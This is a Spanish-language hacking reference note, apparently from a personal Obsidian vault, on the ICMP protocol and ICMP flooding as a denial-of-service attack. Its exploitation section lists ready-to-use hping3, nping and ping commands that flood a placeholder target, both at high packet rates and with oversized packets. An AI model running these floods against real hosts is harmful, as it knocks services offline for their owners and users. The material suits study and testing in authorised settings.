# Teoría

El protocolo #ICMP (_Internet Control Message Protocol_) se utiliza para **enviar mensajes de control y error** en redes IP, como `ping` (Echo Request/Reply) o mensajes de destino inalcanzable.

![[icmp.excalidraw|center]]

ICMP opera en la **capa 3 (Red)** del modelo OSI y no utiliza puertos como TCP o UDP.

# Vulnerabilidad

**ICMP Flooding** es un ataque de #DoS (_Denial of Service_) que consiste en **saturar un objetivo con paquetes ICMP** masivos, consumiendo su ancho de banda y recursos del sistema.

![[icmp-flooding.excalidraw|center]]

Los tipos de ICMP más comunes para flooding:

- **Echo Request (Type 8)**: Solicitudes de ping
- **Echo Reply (Type 0)**: Respuestas de ping
- **Timestamp Request (Type 13)**: Solicitudes de timestamp
- **Address Mask Request (Type 17)**: Solicitudes de máscara de red

# Explotación

Existen varias variantes de este ataque. La técnica de explotación más habitual es la llamada **Rate Packet Flooding**, la cual se centra en enviar la mayor cantidad de paquetes posibles:

~~~tabs

tab: hping3

<span query="codeBlock(_/variables/hacking.md/rhost, code = hping3 --icmp --flood {{rhost}}, lang = )"></span>
``` 
hping3 --icmp --flood ${RHOST}
```
<span type="end"></span>


tab: nping

<span query="codeBlock(_/variables/hacking.md/rhost, code = nping --icmp --rate 1000 {{rhost}}, lang = )"></span>
``` 
nping --icmp --rate 1000 ${RHOST}
```
<span type="end"></span>


tab: ping

<span query="codeBlock(_/variables/hacking.md/rhost, code = ping --flood {{rhost}}, lang = )"></span>
``` 
ping --flood ${RHOST}
```
<span type="end"></span>

~~~

Otra técnica habitual es la **Bandwidth Saturation Flooding**, centrada en enviar paquetes de gran tamaño:

~~~tabs

tab: hping3

<span query="codeBlock(_/variables/hacking.md/rhost, code = hping3 --icmp --data 65495 --interval u1 {{rhost}}, lang = )"></span>
``` 
hping3 --icmp --data 65495 --interval u1 ${RHOST}
```
<span type="end"></span>


tab: nping

<span query="codeBlock(_/variables/hacking.md/rhost, code = nping --icmp --data-length 65400 --rate 1000 {{rhost}}, lang = )"></span>
``` 
nping --icmp --data-length 65400 --rate 1000 ${RHOST}
```
<span type="end"></span>


tab: ping

<span query="codeBlock(_/variables/hacking.md/rhost, code = ping --size 65399 --interval 0.00001 {{rhost}}, lang = )"></span>
``` 
ping --size 65399 --interval 0.00001 ${RHOST}
```
<span type="end"></span>

~~~

## Ataques relacionados

- [[ICMP Smurf Attack]]

# Recursos

~~~tabs

tab: Herramientas

| Repositorio | Descripción |
| ---------------------------------------------------- | ---------------------------------------------------------------- |
| [`hping3`](https://www.kali.org/tools/hping3/) | Active network smashing tool |
| [`iputils-ping`](https://packages.debian.org/bullseye/iputils-ping) | Tools to test the reachability of network hosts |
| [`nmap (nping)`](https://www.kali.org/tools/nmap/#nping) | Network packet generation tool / ping utility |

~~~
